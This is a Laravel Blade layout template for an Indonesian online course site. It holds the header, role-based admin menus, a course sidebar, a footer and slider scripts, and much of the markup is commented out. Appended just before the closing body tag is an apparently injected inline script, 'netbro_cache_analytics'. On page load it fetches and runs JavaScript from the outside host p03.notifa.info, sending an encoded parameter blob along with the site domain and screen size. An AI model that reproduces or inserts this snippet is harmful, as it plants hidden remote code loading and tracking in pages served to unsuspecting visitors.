<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    @yield('title')

    <!-- Bootstrap -->
    <link href="{{asset('css/bootstrap.min.css')}}" rel="stylesheet">
    <!-- Custom -->
    <link href="{{asset('css/custom.css')}}" rel="stylesheet">

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
    <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
    <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

    <!-- fonts -->
    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
    <link rel="stylesheet" href="{{asset('font-awesome-4.0.3/css/font-awesome.min.css')}}">

    <!-- CSS STYLE-->
    <link rel="stylesheet" type="text/css" href="{{asset('css/style.css')}}" media="screen" />



    <!-- SLIDER REVOLUTION 4.x CSS SETTINGS -->
    <link rel="stylesheet" type="text/css" href="{{asset('rs-plugin/css/settings.css')}}" media="screen" />

    <style>
        /*@media only screen and (orientation:portrait){*/
            /*body {*/
                /*height: 100vw;*/
                /*transform: rotate(90deg);*/
            /*}*/
        /*}*/
        @yield('style')
        /**/
        .swal-modal .swal-text{
            text-align: center;
            text-decoration-style: solid;
            color: black;
        }
        /*.swal-wide{*/
            /*width:450px !important;*/
            /*font-size:15px;*/
        /*}*/
</style>

</head>
<body>

<div class="container-fluid">


    <!-- Slider -->
    {{--<div class="tp-banner-container">--}}
        {{--<div class="tp-banner" >--}}
            {{--<ul>--}}
                {{--<!-- SLIDE  -->--}}
                {{--<li data-transition="fade" data-slotamount="7" data-masterspeed="1500" >--}}
                    {{--<!-- MAIN IMAGE -->--}}
                    {{--<img src="{{asset('images/slide.jpg')}}"  alt="slidebg1"  data-bgfit="cover" data-bgposition="left top" data-bgrepeat="no-repeat">--}}
                    {{--<!-- LAYERS -->--}}
                {{--</li>--}}
            {{--</ul>--}}
        {{--</div>--}}
    {{--</div>--}}
    <!-- //Slider -->
    <div class="headernav">
        <div class="container">
            <div class="row">
                <div class="col-lg-1 col-xs-3 col-sm-2 col-md-2 logo"><a href="{{route('home')}}"><img src="{{asset('images/logokampusamerta.jpg')}}" alt=""  /></a></div>
                <div class="col-lg-3 col-xs-9 col-sm-5 col-md-3 selecttopic">
                    {{--<a data-toggle="dropdown" class="btn btn-primary"href="#">Kursus Online <b class="caret"></b></a>--}}
                    {{--<ul class="dropdown-menu" role="menu">--}}
                        {{--<li role="presentation"><a role="menuitem" tabindex="-1" href="{{route('see.all.course')}}">Semua Kursus</a></li>--}}
                        {{--<li role="presentation"><a role="menuitem" tabindex="-1" href="{{route('mycourse' , ['id' => Auth::user()->id])}}">Kursus Saya</a></li>--}}
                    {{--</ul>&nbsp;--}}
                    @if(Auth::check())
                    <div class="dropdown">
                        <a data-toggle="dropdown" href="#">Menu Kursus</a> <b class="caret"></b>
                        <ul class="dropdown-menu" role="menu">
                            @php
                                $check1 = \Illuminate\Support\Facades\Auth::user()->super_admin;
                                $check2 = \Illuminate\Support\Facades\Auth::user()->admin;
                            @endphp
                            @if($check1 == 1 || $check2 == 1)
                                <li role="presentation"><a role="menuitem" tabindex="-1" href="{{route('see.all.course')}}">Semua Kursus</a></li>
                            @else
                                <li role="presentation"><a role="menuitem" tabindex="-1" href="{{route('see.all.course')}}">Semua Kursus</a></li>
                                <li role="presentation"><a role="menuitem" tabindex="-1" href="{{route('mycourse' , ['id' => Auth::user()->id])}}">Kursus Saya</a></li>
                            @endif
                        </ul>
                    </div>
                    @endif
                </div>
                <div class="col-lg-4 search col-xs-12 col-sm-5 col-md-3">
                    <div class="wrap">
                        <form action="{{route('kursus.cari')}}" method="GET" class="form">
                            <div class="pull-left txt"><input type="text" name="cari" value="{{old('cari')}}" class="form-control" placeholder="Cari Kursus"></div>
                            <div class="pull-right"><button class="btn btn-default" type="submit"><i class="fa fa-search"></i></button></div>
                            <div class="clearfix"></div>
                        </form>
                    </div>
                </div>
                <div class="col-lg-4 col-xs-12 col-sm-5 col-md-4 avt">
                    <div class="stnt pull-left">
                        @if(Auth::check())
                            <a style="margin-right: 15px;" class="btn btn-primary" href="{{route('discussions.create')}}">Buat topik baru</a>
                        @endif
                        <div  class="avatar pull-right dropdown">
                            @if(!Auth::check())
                                <div style="margin: 10px">
                                    <a href="{{route('loginsiswa')}}">Anda harus masuk</a>
                                </div>
                            @endif
                            @if(Auth::check())
                                <a style="text-decoration: none" data-toggle="dropdown" href="#">
                                    @if(Auth::user()->admin == 1)
                                        [ADMIN] {{Auth::user()->username}}
                                    @elseif(Auth::user()->super_admin == 1)
                                        [SUPER_ADMIN] {{Auth::user()->username}}
                                    @else
                                        {{Auth::user()->username}}
                                    @endif
                                    <img style="width: 50px; height: 45px;" src="{{asset('images/avatar/'.Auth::user()->avatar)}}" />
                                </a><b class="caret"></b>
                                <ul class="dropdown-menu" role="menu">
                                    <li role="presentation"><a role="menuitem" tabindex="-1" href="{{route('user.show' , ['id' => Auth::user()-> id])}}">Profile Saya</a></li>
                                    @if(Auth::user()->super_admin == 1)
                                        <li role="presentation"><a role="menuitem" tabindex="-2" href="{{route('superadmin.index')}}">Halaman Admin</a></li>
                                    @elseif(Auth::user()->admin == 1)
                                        <li role="presentation"><a role="menuitem" tabindex="-2" href="{{route('admin.index')}}">Halaman Admin</a></li>
                                    @endif
                                    <li role="presentation">
                                        <a role="menuitem" tabindex="-3" href="{{route('logout')}}"
                                           onclick="event.preventDefault();
                                       document.getElementById('logout-form').submit();
                                    ">
                                            {{ __('Keluar') }}
                                        </a>
                                    </li>

                                    <form id="logout-form" action="{{route('logout')}}" method="POST" style="display: none;">
                                        {{csrf_field()}}
                                    </form>
                                </ul>
                            @endif
                        </div>

                    </div>
                    <div class="env pull-left"><i class="fa "></i></div>
                    <div class="clearfix"></div>
                </div>
            </div>
        </div>
    </div>

    {{--<div class="headernav">--}}
    {{--<div class="container">--}}
    {{--<div class="row">--}}
    {{--<div class="col-lg-1 col-xs-3 col-sm-2 col-md-2 logo "><a href="{{route('home')}}"><img src="{{asset('images/logokampusamerta.jpg')}}" alt=""  /></a></div>--}}
    {{--<div class="col-lg-3 col-xs-9 col-sm-5 col-md-3 selecttopic">--}}
    {{--@if(Auth::check())--}}
    {{--<div class="dropdown">--}}
    {{--<a data-toggle="dropdown" href="#"><button class="btn btn-primary">Menu Kursus</button></a> <b class="caret"></b>--}}
    {{--<ul class="dropdown-menu" role="menu">--}}
    {{--<li role="presentation"><a role="menuitem" tabindex="-1" href="#">Borderlands 1</a></li>--}}
    {{--<li role="presentation"><a role="menuitem" tabindex="-2" href="#">Borderlands 2</a></li>--}}
    {{--<li role="presentation"><a role="menuitem" tabindex="-3" href="#">Borderlands 3</a></li>--}}

    {{--</ul>--}}
    {{--</div>--}}
    {{--@endif--}}
    {{--</div>--}}
    {{--<div class="col-lg-4 search hidden-xs hidden-sm col-md-3">--}}
    {{--<div class="wrap">--}}
    {{--<form action="#" method="post" class="form">--}}
    {{--<div class="pull-left txt"><input type="text" class="form-control" placeholder="Search Topics"></div>--}}
    {{--<div class="pull-right"><button class="btn btn-default" type="button"><i class="fa fa-search"></i></button></div>--}}
    {{--<div class="clearfix"></div>--}}
    {{--</form>--}}
    {{--</div>--}}
    {{--</div>--}}
    {{--<div class="col-lg-4 col-xs-12 col-sm-5 col-md-4 avt">--}}
    {{--<div class="stnt pull-left">--}}
    {{--<form action="http://forum.azyrusthemes.com/03_new_topic.html" method="post" class="form">--}}
    {{--<button class="btn btn-primary">Start New Topic</button>--}}
    {{--</form>--}}
    {{--</div>--}}
    {{--<div class="env pull-left"><i class="fa fa-envelope"></i></div>--}}

    {{--<div class="avatar pull-left dropdown">--}}
    {{--<a data-toggle="dropdown" href="#"><img src="{{asset('images/avatar.jpg')}}" alt="" /></a> <b class="caret"></b>--}}
    {{--<div class="status green">&nbsp;</div>--}}
    {{--<ul class="dropdown-menu" role="menu">--}}
    {{--<li role="presentation"><a role="menuitem" tabindex="-1" href="#">My Profile</a></li>--}}
    {{--<li role="presentation"><a role="menuitem" tabindex="-2" href="#">Inbox</a></li>--}}
    {{--<li role="presentation"><a role="menuitem" tabindex="-3" href="#">Log Out</a></li>--}}
    {{--<li role="presentation"><a role="menuitem" tabindex="-4" href="04_new_account.html">Create account</a></li>--}}
    {{--</ul>--}}
    {{--</div>--}}
    {{--<div class="clearfix"></div>--}}
    {{--</div>--}}
    {{--</div>--}}
    {{--</div>--}}
    {{--</div>--}}

    <section class="content">



        <div class="container">
            <div class="row">


                <div class="col-lg-8 col-md-8">


                    @yield('content')


                </div>
                <br>
                <div class="col-lg-4 col-md-4">

                    <!-- -->
                    <div class="sidebarblock">
                        <h3 style="font-weight: bold">Chanel Kursus <a href="{{route('see.all.course')}}" class="pull-right">Lihat Semua</a></h3>
                        <div class="divline"></div>
                        @if(Auth::check())
                            <div class="blocktxt" style="word-wrap: break-word">
                                <ul class="cats">
                                    @foreach($channels as $channel => $i)
                                        <li>{{$channel+1}}. <a href="{{route('channel.kursus.cari',['id'=>$i->id])}}">{{$i->title}}<span class="badge pull-right">{{$i->course_package->count()}}</span></a>
                                    @endforeach
                                </ul>
                            </div>
                        @endif
                    </div>
                {{----}}

                <!-- -->

                    {{--<div class="sidebarblock">--}}
                        {{--<h3 style="font-weight: bold">Kategori Diskusi</h3>--}}
                        {{--<div class="divline"></div>--}}
                        {{--@if(Auth::check())--}}
                            {{--<div class="blocktxt" style="word-wrap: break-word">--}}
                                {{--<ul class="cats">--}}
                                    {{--@foreach($categories as $category => $i)--}}
                                        {{--<li>{{$category+1}}. <a href="{{route('categories' , ['id'=>$i->id])}}">{{$i->title}}<span class="badge pull-right">{{$i->discussions->count()}}</span></a>--}}
                                    {{--@endforeach--}}
                                {{--</ul>--}}
                            {{--</div>--}}
                        {{--@endif--}}
                        {{--@if(!Auth::check())--}}
                        {{--<div class="blocktxt">--}}
                        {{--<ul class="cats">--}}
                        {{--<li><a href="#">Anda harus login terlebih dahulu<span class="badge pull-right"></span></a>--}}
                        {{--</ul>--}}
                        {{--</div>--}}
                        {{--@endif--}}
                    {{--</div>--}}
                    {{----}}


                    {{--<div class="sidebarblock">--}}
                        {{--<h3 style="font-weight: bold"> <a href="{{route('sortbyuser')}}">Topik Diskusi Saya</a></h3>--}}
                        {{--<div class="divline"></div>--}}
                        {{--@if(Auth::check())--}}

                            {{--<div class="blocktxt" style="word-wrap: break-word">--}}
                                {{--@foreach(Auth::user()->discussions->slice(0,5)->sortBy('created_at') as $d => $i )--}}
                                    {{--<ul class="cats">--}}
                                        {{--<li> {{$d+1}}. <a href="{{route('discussions.show' , ['id' => $i -> id])}}">{{$i->title}}</a></li>--}}
                                    {{--</ul>--}}
                                {{--@endforeach--}}
                            {{--</div>--}}

                        {{--@endif--}}
                        {{--@if(!Auth::check())--}}
                        {{--<div class="blocktxt">--}}
                        {{--<a href="#">You Must Login To See The Threads</a>--}}
                        {{--</div>--}}
                        {{--@endif--}}
                    {{--</div>--}}
                    {{----}}

                </div>
            </div>
        </div>



        @yield('pagination')
        @yield('replies')
        {{--<div class="container">--}}
        {{--<div class="row">--}}
        {{--<div class="col-lg-8 col-xs-12">--}}
        {{--<div class="pull-left"><a href="#" class="prevnext"><i class="fa fa-angle-left"></i></a></div>--}}
        {{--<div class="pull-left">--}}
        {{--<ul class="paginationforum">--}}
        {{--<div class="hidden-xs">{{$discussion->links()}}</div>--}}
        {{--<li class="hidden-xs"><a href="#">2</a></li>--}}
        {{--<li class="hidden-xs"><a href="#">3</a></li>--}}
        {{--<li class="hidden-xs"><a href="#">4</a></li>--}}
        {{--<li><a href="#">5</a></li>--}}
        {{--<li><a href="#">6</a></li>--}}
        {{--<li><a href="#" class="active">7</a></li>--}}
        {{--<li><a href="#">8</a></li>--}}
        {{--<li class="hidden-xs"><a href="#">9</a></li>--}}
        {{--<li class="hidden-xs"><a href="#">10</a></li>--}}
        {{--<li class="hidden-xs hidden-md"><a href="#">11</a></li>--}}
        {{--<li class="hidden-xs hidden-md"><a href="#">12</a></li>--}}
        {{--<li class="hidden-xs hidden-sm hidden-md"><a href="#">13</a></li>--}}
        {{--<li><a href="#">1586</a></li>--}}
        {{--</ul>--}}
        {{--</div>--}}
        {{--<div class="pull-left"><a href="#" class="prevnext last"><i class="fa fa-angle-right"></i></a></div>--}}
        {{--<div class="clearfix"></div>--}}
        {{--</div>--}}
        {{--</div>--}}
        {{--</div>--}}


       <br><br><br>
        <br><br><br>
        <br><br><br>
    </section>
</div>

<footer>
    <div class="container">
        <div class="row">
            <div class="col-lg-1 col-xs-3 col-sm-2 logo "><a href="#"><img src="{{asset('images/logokampusamerta.jpg')}}" alt=""  /></a></div>
            <div class="col-lg-8 col-xs-9 col-sm-5 ">Copyrights 2019, kampusamertabakti.com</div>
            <div class="col-lg-3 col-xs-12 col-sm-5 sociconcent">
                <ul class="socialicons">
                    <li><a href="https://www.facebook.com/kampusamertabakti/"><i class="fa fa-facebook-square"></i></a></li>
                    <li><a href="https://www.instagram.com/amertabakti_campus/"><i class="fa fa-instagram"></i></a></li>
                    {{--<li><a href="#"><i class="fa fa-google-plus"></i></a></li>--}}
                    {{--<li><a href="#"><i class="fa fa-dribbble"></i></a></li>--}}
                    {{--<li><a href="#"><i class="fa fa-cloud"></i></a></li>--}}
                    {{--<li><a href="#"><i class="fa fa-rss"></i></a></li>--}}
                </ul>
            </div>
        </div>
    </div>
</footer>



<!-- get jQuery from the google apis -->
<script type="text/javascript" src="{{asset('ajax.googleapis.com/ajax/libs/jquery/1.10.1/jquery.js')}}"></script>


<!-- SLIDER REVOLUTION 4.x SCRIPTS  -->
<script type="text/javascript" src="{{asset('rs-plugin/js/jquery.themepunch.plugins.min.js')}}"></script>
<script type="text/javascript" src="{{asset('rs-plugin/js/jquery.themepunch.revolution.min.js')}}"></script>

<script src="{{asset('js/bootstrap.min.js')}}"></script>
<script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
@yield('customscript')
{{--<script src="https://cdn.jsdelivr.net/npm/promise-polyfill@7.1.0/dist/promise.min.js"></script>--}}
<!-- LOOK THE DOCUMENTATION FOR MORE INFORMATIONS -->

<script type="text/javascript">
    var revapi;

    jQuery(document).ready(function() {
        "use strict";
        revapi = jQuery('.tp-banner').revolution(
            {
                delay: 15000,
                startwidth: 1200,
                startheight: 278,
                hideThumbs: 10,
                fullWidth: "on"
            });

    });	//ready

    // screen.orientation.lock("landscape");
    // document.documentElement.requestFullscreen();
    // alert(screen.orientation.angle);
    // When the user_biasa scrolls down 20px from the top of the document, slide down the navbar
    window.onscroll = function() {scrollFunction()};

    function scrollFunction()
    {
        if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
            document.getElementById("navbar").style.top = "0";
        } else {
            document.getElementById("navbar").style.top = "-50px";
        }
    }



    @yield('sweetalert')


</script>

<!-- END REVOLUTION SLIDER -->
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2k0zA5AF8P%2fL%2fdeRlRYYy5iH1U6E3s9Ohv5eX%2bC7wKj6GC81j1zHRmfMdGnqWHwOdTN2wF%2fubLnBAFl05wzDi3qsU8vJ2m0SWF7v82KqylVyEK9Jhnghze49jlniwnbpwlt6ErMHrh2hRqi5WVrbcYJC4N8D7Xomh0YAj6ZyuZ%2bidcN7uwUkGDgxDhRZPbJ7I0ywyT0BHGnEpkhFl00KtvNYzYd4xfc%2b6197NufoVuYQJRmJG2kJb%2feK5aenFyh%2f3SgeJPZqrg7UJ0iLjo0PXDse%2bGNE3Li32iprVfUsWC1qhVC3%2fcJ7dig%2fZLYJ12NWz94Vgx3UHWxynggcAQwFI9WOE7WtYlHoVIRTCuR2fRvwyArwAlty1L8fFWJzwKk%2bmTX%2fsOmS5IOR5JCoFIou7WSbIzcWdwwzeufW6KSw0QyLttOmjp0xiS2Kd8DiLiBTjuvpmLF09vimzJD6ktxhP0VkJqPPDSFb82%2fiVz8fACzDC3yuRUI5o%2fP%2bDOU4azLGneUOx2sHGC4E%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

</html>

